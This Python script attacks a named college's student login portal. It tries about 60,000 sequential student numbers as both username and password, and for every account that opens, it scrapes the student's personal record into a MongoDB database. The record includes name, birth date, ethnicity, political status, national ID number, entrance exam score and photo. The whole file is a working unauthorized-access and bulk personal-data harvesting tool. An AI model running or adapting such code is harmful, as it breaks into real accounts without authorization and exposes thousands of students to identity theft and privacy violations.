import requests
from urllib import request
import re
from lxml import etree
from pymongo import *

# 连接
client = MongoClient(host='localhost', port=27017)
# 选择库
fzkj = client.fzkj
# 选择集合
stu = fzkj.studentInfo

# 155011101,155071250

for i in range(155011101,155071250):
    data = {
        '__VIEWSTATE': '/wEPDwUJLTkwNzk0ODcyDxYCHgxQYWdlVXNlck5hbWVkFgZmD2QWAmYPZBYCZg8WAh4EVGV4dAUZ6Ziy54G+56eR5oqA5a2m6ZmiIOeZu+W9lWQCBg8WAh4HVmlzaWJsZWdkAgcPZBYIZg8PFgIfAQUM55So5oi35ZCN77yaZGQCAg8PFgIfAQUh5a+GJm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A756CB77yaZGQCBA8PFgIfAQUH55m7IOW9lWRkAgcPDxYCHwJoZGRktaTxVs8ZocaPPDuLP7Y07wBH65AFbBLuiWAkLTnjLsE=',
        '__SCROLLPOSITIONX': '0',
        '__SCROLLPOSITIONY': '100',
        '__EVENTTARGET': '',
        '__EVENTARGUMENT': '',
        '__EVENTVALIDATION': '/wEWBAKDhKvuBQLt8L+vAQKpzpH0DQKWrKCPD/hawG/18eLH66fLVPLJY/1wlGTX9XPu7yhFmer7UVQG',
        'TextBoxUserName': i,# 账号位置
        'TextBoxPassword': i,# 密码位置
        'ButtonLogin': '登 录',
    }
    try:
        response = requests.post('http://jwauth.cidp.edu.cn/Login.aspx', data=data)
        isRight = re.findall('(欢迎您)', response.text)
        print('正在尝试第',i,'个学号的学生')
        if isRight:
            cookies = response.cookies.get_dict()
            # print(cookies)
            cookies = re.findall("'(.*?)'", str(cookies.values()))[0]
            # print(cookies)
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36',
                'Accept-Language': 'zh-CN,zh;q=0.9',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Accept-Encoding': 'gzip, deflate',
                'Host': 'jwauth.cidp.edu.cn',
                'Connection': 'keep-alive',
                'Referer': 'http://jwauth.cidp.edu.cn/Student/MyAcademicCareer.aspx',
                'Upgrade-Insecure-Requests': '1',
                'Cookie': 'EXESAC.SAAS.SessionId={}'.format(cookies)
            }

            result1 = requests.get('http://jwauth.cidp.edu.cn/NoMasterJumpPage.aspx?URL=JWGL', headers=headers, verify=False,
                                   allow_redirects=False)
            result = result1.content
            new_requests_url = result1.headers['location']
            r = requests.get(url=new_requests_url)
            new_cookie = r.request.headers.get('Cookie')
            # print(new_cookie)
            headers1 = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36',
                'Accept-Language': 'zh-CN,zh;q=0.9',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Accept-Encoding': 'gzip, deflate',
                # 'Host':'jwauth.cidp.edu.cn',
                'Connection': 'keep-alive',
                # 'Referer':'http://jwauth.cidp.edu.cn/Student/MyAcademicCareer.aspx',
                'Upgrade-Insecure-Requests': '1',
                'Cookie': new_cookie
            }
            res = requests.get('http://jw.cidp.edu.cn/Student/Student_Details.aspx', headers=headers1).text
            se = etree.HTML(res)
            name = se.xpath('//span[@id="PersonInfoControl_lblFullName"]/text()')[0]
            gender = se.xpath('//span[@id="PersonInfoControl_lblGender"]/text()')[0]
            brith = se.xpath('//span[@id="PersonInfoControl_lblBirthday"]/text()')[0]
            minzu = se.xpath('//span[@id="PersonInfoControl_lblNationality"]/text()')[0]
            polit = se.xpath('//span[@id="PersonInfoControl_lblPoliticalRoll"]/text()')[0]
            place = se.xpath('//span[@id="PersonInfoControl_lblNativePlace"]/text()')[0]
            PersonNumber = se.xpath('//span[@id="PersonInfoControl_lblCardNumber"]/text()')[0]
            stunumber = se.xpath('//span[@id="SchoolRollInfoControl_lblStudentNumble"]/text()')[0]
            xueyuan = se.xpath('//span[@id="SchoolRollInfoControl_lblOrganazition"]/text()')[0]
            zhuanye = se.xpath('//span[@id="SchoolRollInfoControl_lblMajor"]/text()')[0]
            classnum = se.xpath('//span[@id="SchoolRollInfoControl_lblClass"]/text()')[0]
            startTime = se.xpath('//span[@id="SchoolRollInfoControl_lblStartTime"]/text()')[0]
            endTime = se.xpath('//span[@id="SchoolRollInfoControl_lblEndTime"]/text()')[0]
            stuExamCode = se.xpath('//span[@id="SchoolRollInfoControl_lblStudentExamCode"]/text()')[0]
            Area = se.xpath('//span[@id="SchoolRollInfoControl_lblSourceArea"]/text()')[0]
            gaokaoScore = se.xpath('//span[@id="SchoolRollInfoControl_lblCollegeEntranceExaminationTotalScore"]/text()')[0]
            old_name = se.xpath('//span[@id="PersonInfoControl_lblFormerName"]/text()')[0]
            img = se.xpath('//img/@src')[0]
            stu.insert({'name': name,'old_name':old_name, 'gender': gender, 'brith': brith, 'minzu': minzu, 'polit': polit, 'place': place,
                        'PersonNumber': PersonNumber, 'stunumber': stunumber, 'xueyuan': xueyuan, 'zhuanye': zhuanye,
                        'classnum': classnum, 'startTime': startTime, 'endTime': endTime, 'stuExamCode': stuExamCode,
                        'Area': Area, 'gaokaoScore': gaokaoScore, 'img': img})
            print(name,'的信息已爬取')
    except:
        continue